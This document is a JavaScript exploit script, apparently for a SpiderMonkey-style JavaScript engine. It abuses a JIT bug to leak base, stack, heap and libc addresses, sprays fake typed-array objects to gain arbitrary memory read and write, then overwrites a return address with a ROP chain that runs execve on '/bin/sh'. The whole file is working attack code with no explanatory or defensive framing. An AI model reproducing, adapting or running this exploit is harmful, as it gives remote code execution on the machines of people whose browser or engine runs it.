var convert = new ArrayBuffer(0x100);
var u32 = new Uint32Array(convert);
var f64 = new Float64Array(convert);

var BASE = 0x100000000;
Math.acos({});
function i2f(x) {
    u32[0] = x % BASE;
    u32[1] = x / BASE;
    return f64[0];
}

function f2i(x) {
    f64[0] = x;
    return u32[0] + BASE * u32[1];
}

function hex(x) {
    return `0x${x.toString(16)}`
}

var victim = {a:0x1337};

function gen(m) {
    var expr = '1+('.repeat(m) + '{a:y}' + ')'.repeat(m);

    var code = `
    f = function(o) {
        var y = victim;
        var a = [o];
        a.length = a[0];
        var useless = function() { }
        useless + useless + useless + useless + useless + useless;
        var sz = Array.prototype.push.call(a, 1337, 43);
        (function() { sz; })();
        var o = ${expr};
    }
    `;
    eval(code);
    for (var j = 0; j < 10000; j++) {
        f(1);
    }
}

var spray_values = [
    //0xfdea,0xdbee, 0x0dea, 0xfffe,
    0xbeef,0xdead, 0xbeef, 0xdead,
];

function spray() {
    //JSON.parse('"\\u4142\\u4344\\u4546\\u4748\\u494a\\u4b4c\\u4d4e"');
    String.fromCodePoint(spray_values[0], spray_values[1],
                         spray_values[2], spray_values[3]);
}

function rec(f) {
    if (DEPTH == 0) {
        f();
    } else {
        DEPTH--;
        rec(f);
    }
}
function at_depth(depth, f) {
    DEPTH = depth;
    rec(f);
}

for (var i = 0; i < 10000; ++i) {
    at_depth(i % 15, () => {Math.cos(1)});
}

function at(u32, offset, val, hi = null) {
    u32[offset/4] = val % BASE;
    if (hi !== null)
        u32[offset/4+1] = hi;
    else
        u32[offset/4+1] = val / BASE;
}


//var tmpl = {a:null};
//var tmpl = new Uint32Array(0x50);
//tmpl[0] = 0x41414141;
//tmpl[1] = 0x42424242;
//print(`tmpl @ ${hex(addrof(tmpl))}`);
//Math.sin(1);
//var elems = read(addrof(tmpl) + 0x18);
//print(`elems @ ${hex(elems)}`);

function leak_fake_array() {
    //fakeobj(0xdeadbeefdea).x;

    base = 0;
    var stack = 0;
    var heap = 0;

    var leak = [];
    for (var i = 0; i < 30; ++i) {
        gen(i);
        f(100);

        var x = f2i(victim.a);

        leak.push(x);
        //print ("\nFull leak:\n" + leak.map(hex).join("\n"))
    }


    base = leak[18] - 0x1a9e640;
    stack = leak[17];
    heap = leak[2];

    print(
        "Base: " + hex(base) + "\n" +
        "Stack: " + hex(stack) + "\n" +
        "Heap: " + hex(heap) + "\n" +
        "\nFull leak:\n" + leak.map(hex).join("\n"))
    let loc = heap - 0x10000000;
    loc = loc - (loc % (0x1000))

    abs = [];
    let sz = 0x100000;

    for (let i = 0; i < 50; ++i) {
        abs.push(new Uint32Array(sz).fill(0))
        ab = abs[abs.length - 1]
        for (let off = 0; off < sz*4; off += 0x200) {
            // Uint32Array
            at(ab, off+0, loc+0x40);              // group
            //at(ab, off+8, 0xdeadbeef);          // shape doesn't matter
            at(ab, off+0x18, base + 0xb35e00);     // elements = _ZL19emptyElementsHeader+16
            at(ab, off+0x20, 0, 0xfffa0000);      // buffer = null
            at(ab, off+0x28, 0x1000, 0xfff88000); // length
            at(ab, off+0x38, loc + 0x100);

            // ObjectGroup
            at(ab, off+0x40, base + 0x1a79070); // clasp = _ZN2js16TypedArrayObject7classesE+240
            at(ab, off+0x40+0x18, 1 | 3);  // 3 == OBJECT_FLAG_SINGLETON

            // data
            at(ab, off+0x100, i);
            at(ab, off+0x100+4, off);
        }
        ab[0] = 0xdeadbeef;
    }
    print("controlled data @ " + hex(loc))
    return [abs, loc];
}

function pwn() {
    let [abs, addr] = leak_fake_array();
    //print(`addr = ${hex(addr)}`);
    //Math.sin(1);
    //var u32 = fakeobj(addr);
    //print(u32[0]);

    let tmp = addr;
    for (var i = 0; i < 3; ++i) {
        spray_values[i] = tmp % 0x10000;
        tmp = Math.floor(tmp / 0x10000);
    }
    spray_values[3] = 0xfffe;

    victim = {a:0x4242};
    gen(662);

    at_depth(80, ()=>spray());
    //Math.sin(1);
    at_depth(40, ()=>f(100));

    let fake = victim.a;
    let ary_idx = fake[0];
    let off = fake[1];
    //print(`idx = ${ary_idx}, offset = ${off}`);

    const set_addr = (where) => at(abs[ary_idx], off+0x38, where);

    function write(where, lo, hi=null) {
        eval(`var doit = function(where, lo, hi) {
        set_addr(where);
        fake[0] = lo;
        fake[1] = (hi !== null) ? hi : Math.floor(lo / BASE);
        }`);
        doit(where, lo, hi);
    }

    function read(where) {
        set_addr(where);
        return fake[0] + (fake[1] & 0xffff) * BASE;
    }

    write(addr + 0x200, 1337);
    if (1337 != read(addr + 0x200) || 1337 != abs[ary_idx][(off+0x200)/4]) {
        print('fail');
        throw null;
    }

    let libc = read(base + 0x1a9b9b8) - 0x7b110;
    print('libc @ ' + hex(libc));

    // offset of program_invocation_name 0x3ec508
    let stack = read(libc + 0x3ec508);
    // offset of return function 0x89e471
    stack = stack + (8 - (stack % 8));
//        stack -= 0x1000;
    print("worked stack addr " + hex(stack));
    //while (read(stack) != base + 0xd4f98) {
    while (read(stack) != base + 0x3cfe44) {
        stack = stack - 8;
    }
    print("worked found return address");
    write(stack, 0x414141414141);
    write(addr + 0x200, libc + 0x1b3e9a);
    write(addr + 0x208, 0);


    write(stack, base + 0xd4583);
    write(stack + 8, libc + 0x1b3e9a);

    write(stack + 16, base + 0xd5cf0);
    write(stack + 24, addr + 0x200);

    write(stack + 32, base + 0xd76c4);
    write(stack + 40, 0);


    write(stack + 48, base + 0x48ed0);
    write(stack + 56, 59);
    write(stack + 64, libc + 0xd2975);
    //write(stack + 64, 0x414141414141);
    //offset of bin/sh 0x1b3e9a
}

pwn();
